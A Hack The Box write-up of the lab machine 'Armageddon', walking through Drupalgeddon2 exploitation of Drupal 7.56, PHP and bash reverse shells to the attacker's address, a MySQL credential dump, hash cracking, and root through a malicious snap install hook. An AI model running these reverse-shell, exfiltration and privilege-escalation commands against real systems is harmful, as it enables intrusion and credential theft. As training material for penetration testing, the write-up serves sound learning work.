---
title:     "Hack The Box - Armageddon"
tags: [HackTheBox,Linux,Easy]
layout: post
categories: HackTheBox-Writeups
---

![](/images/HTB/Armageddon/armageddon.png)

# Introduction
Armageddon is a easy rated Windows machine staring off focusing on the Drupalgeddon exploit. What makes this box interesting is a lot of the normal tricks used do not work, forcing you to figure out why. Let's get started!

# Initial Enumeration

## Nmap scan
```
# Nmap 7.91 scan initiated Sun Apr  4 11:49:58 2021 as: nmap -T3 -Pn -O -p T:22,80 -sV --script=default,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse -oN /storage/HackTheBox/Armageddon/nmap/vuln_10.10.10.233.nmap 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.0086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  4 11:50:10 2021 -- 1 IP address (1 host up) scanned in 12.33 seconds
```
## HTTP
This machine only came back with SSH and HTTP ports open so we know we are attacking something on the web site. Nmap was kind enough to show us that there is a robots.txt file but before we get to that let's poke around the website. We are greeted with a simple login form and really nothing else. We are given the options to create a new user and request a new password so we can play with those a bit. Creating a new account tells us that the account is pending approval and that an email has been sent with further instructions. Right above this message is an error saying that the email could not be sent so it seems like this is going to be a dead end.

![](/images/HTB/Armageddon/registered.png)

Continuing to poke around we can do some username and email enumeration based on the error messages provided. Trying to login with an unknown user tells us that the username or password is unrecognized, however trying to login with an account we created tells us that the username has either not be activated or it is blocked which lets us know that the username does actually exist.

![](/images/HTB/Armageddon/no_user.png)

![](/images/HTB/Armageddon/user_enumeration.png)

Furthermore if we try to register a new account using a username or email that already exists the site tells us.

![](/images/HTB/Armageddon/user_email_enum.png)

We could try to guess some usernames or email addresses but before we jump down that rabbit hole let's see what else we can find.

## Robots.txt & changelog.txt
Going back to our Nmap scan we know that this site has a robots.txt file which gives us a few directories and a whole bunch of files we can explore. As we poke around we should take a look at CHANGELOG.txt since they usually provide specific version numbers for whatever they are for and are great for enumeration. This one happens to be for Drupal and shows us that the site is running Drupal 7.56.

![](/images/HTB/Armageddon/changelog.png)

All it takes is a quick Google search for `Drupal 7.56 exploit` to find the GitHub for Drupalgeddon. Seeing as the machine name is 'Armageddon' we can be pretty sure we are on the correct path.

# Beginning the exploit process
The GitHub for Drupalgeddon has very well written documentation which can help a lot. We can grab this exploit using `git clone https://github.com/dreadlocked/Drupalgeddon2` and running it is as simple as running `ruby drupalggedon2.rb 10.10.10.233`.

![](/images/HTB/Armageddon/drupalgeddon.png)

Just like that we now have a basic web shell on the machine. The issue here is this shell is it only executes one command at a time so we cant for example change directories and list the files. We can get around this by using full paths every time (ex: `ls /var/www/html/sites)` but this gets a bit annoying. It is entirely possible to do get what you need from only this web shell though.

## Getting creds the easy way
If you are just looking for the solution to the box I'll show you the easy way of doing this first and we'll explore the longer process later. There are SQL credentials in the `/var/www/html/sites/default/settings.php` file.

![](/images/HTB/Armageddon/settingsphp.png)

With those credentials we can dump the SQL database using mysqldump. Doing that is as easy as running `mysqldump -u drupaluser --password=CQHEy@9M*m23gBVj drupal | tee cyphersqldump.txt` which leaves a nice file in the webroot we can grab with wget.

![](/images/HTB/Armageddon/wget.png)

## Getting creds the longer way
This is ultimately the path I took to get the credentials and it presented a bunch of learning opportunities. 

### Getting a full shell
The first thing I wanted to do after getting the basic shell was get a full shell. Since we are using PHP for the web shell my mind instantly went to using the pentestmonkey PHP reverse shell. We can verify that the box has cURL by checking with `which curl` so we can easily transfer it to the machine that way. First we modify the PHP file with our IP and a port (I'm using port 6868 which will be important later on) and we can serve it from our machine with `python3 -m http.server 80`. Now we can download it to the box using `curl 10.10.14.9/cypher.php -o cypher.php`. We can start our listener with `nc -lvnp 6868` and navigate to `10.10.10.233/cypher.php`. At this point we should get a shell however we instead see a permission denied error.

![](/images/HTB/Armageddon/failedphpshell.png)

I wasn't sure what was going on so I decided to try another shell. After a quick visit to the revere shell cheat sheet I decided to try the simple bash reverse shell and was greeted with another error.

![](/images/HTB/Armageddon/badchar.png)

Thankfully the documentation for drupalgeddon specifically says that there are limited characters that can be used and to try base64 encoding payloads. So let's throw the command in CyberChef and try again, making sure to base64 decode the command on the server.

![](/images/HTB/Armageddon/base64error.png)

Odd, it seems like we are only getting part of the command. Looking at our base64 string I started wondering if the '+' was interfering. To get around this I simply re-encoded the base64 string I already had and the new longer string no longer had a plus sign. That means we need to decode it twice on the server now, but I was pleased to see that the full output was being displayed. Finally I added `| bash` to the end to make sure the command was executed.

![](/images/HTB/Armageddon/bashdenied.png)

There is that permission denied again. It was only after staring at this incredibly simple reverse shell that I realized what permission denied likely meant. This is a web service, perhaps it only had permission to use ports related to the web. Let's try changing the port to something focused around HTTP, like port 80.

![](/images/HTB/Armageddon/shellconnect.png)

Much better. As it turns out the PHP shell would have also worked if we had tried port 80. Now we can use the normal python trick to spawn a PTY.

![](/images/HTB/Armageddon/outofpty.png)

Oh. We cant. From what I can tell this is because we are currently in a jail. Honestly I just decided to live with it. At least I could navigate around the file system now so I was happy.

### More enumeration
We see that we are running as apache from running `whoami` and we also find out that we cannot access `/home` because we do not have permission. I spent some time looking around and I had completely missed the `sites` directory in the webserver so i ended up pulling over linpeas and letting that run. It's simple enough to host it and pull it over using the same python webserver and cURL command that we used before.

![](/images/HTB/Armageddon/linpeas.png)

After letting linpeas run and looking over the data I came to the section about pwd or passw being located in PHP files. A quick glance at this and seeing the password `CQHEy@9M*m23gBVj` stuck out as not being some sort of default password.

![](/images/HTB/Armageddon/peaspw.png)

After I saw this I went and found the rest of the information in the `/var/www/html/sites/default/settings.php` file.

![](/images/HTB/Armageddon/settingsphp.png)

### MySQL
So we now have credentials and we saw in linpeas that the server is indeed listening on port 3306 so we should be able to log in to MySQL and grab what we need right?

![](/images/HTB/Armageddon/mysqlfail.png)

Oh, right, we don't have a full interactive shell. Trying to log in dumps us into a black hole we cant escape. At this point I started looking around and trying to find out how I could get the information out of MySQL since it was clear this was what we were supposed to be doing. I stumbled upon `mysqldump` and found this to be exactly what I was looking for. After running `mysqldump -u drupaluser --password=CQHEy@9M*m23gBVj drupal` and seeing my screen get blasted with information I decided to save the output to a file and pull it back over to my kali machine to examine. Adding `| tee cyphersqldump.txt` dumps it into a file and making sure to run this in `/var/www/html` allows us to easily grab it with wget. Obviously we should delete it immediately after we grab it so we don't leave files for others lying around.

![](/images/HTB/Armageddon/wget.png)

# Getting user
Now that we have this SQL dump we can guess that we are going to find some user credentials within. While doing our enumeration on the box we find that there was a user `brucetherealadmin` so my first thought was to look into the dump and do a search for `bruce` to see if we can find his information. 

![](/images/HTB/Armageddon/dumpcreds.png)

We get a wall of text again but scrolling to the top gives us exactly what we are looking for, a password hash. We can identify this hash with `echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' | hashid -m` and find out that it is a Drupal 7 hash which thankfully makes sense based on our previous exploits. The `-m` shows us that this is mode 7900 on hashcat which will be our next stop so we can crack this. After putting the hash into drupal.txt and navigating to our hashcat directory we can crack the hash by running `hashcat.exe -a 0 -m 7900 drupal.txt rockyou.txt`.

![](/images/HTB/Armageddon/cracked.png)

After a few seconds we find out the password is `booboo`. All that's left is logging in via SSH and grabbing the user flag.

![](/images/HTB/Armageddon/user.png)

# Getting root
One of the first things I check after getting a new user is `sudo -l`, and in this case we find that we can run `(root) NOPASSWD: /usr/bin/snap install *`. Heading over to GTFOBins we see that there is a way to to use sudo with snap to maintain privileges. It tells us that we need to create a package with `fpm` and gives us a link to the GitHub page as well as giving us the instructions for creating the package. Heading over to the GitHub page we find a link to the installation guide, and following that we can get fpm installed.

```
apt-get install ruby ruby-dev rubygems build-essential
gem install --no-document fpm
```
Once we have fpm installed we can follow the directions on GTFOBins to create the file, however we are going to make a few changes. Rather than using the `$COMMAND` variable I'm going to insert the command directly. I'm also going to skip using the temp directory so I can keep the files in my notes for the box.

The sample code is using `sh` as the interpreter for the command we are running and I'm going to change that to bash so we don't have problem with the file descriptors in the reverse shell command.

```
mkdir -p meta/hooks
printf '#!/bin/bash\n%s; false' "bash -i >& /dev/tcp/10.10.14.9/6868 0>&1" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

```

Once the file is generated we can grab it with curl and run the `sudo snap install xxxx_1.0_all.snap --dangerous --devmode` that is given to us.

![](/images/HTB/Armageddon/root.png)

Boom.


# References 

- [GitHub - dreadlocked/Drupalgeddon2: Exploit for Drupal v7.x + v8.x (Drupalgeddon 2 / CVE-2018-7600 / SA-CORE-2018-002)](https://github.com/dreadlocked/Drupalgeddon2)
- [GitHub - pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
- [Reverse Shell Cheat Sheet \| pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PEASS-ng/linPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [snap \| GTFOBins](https://gtfobins.github.io/gtfobins/snap/)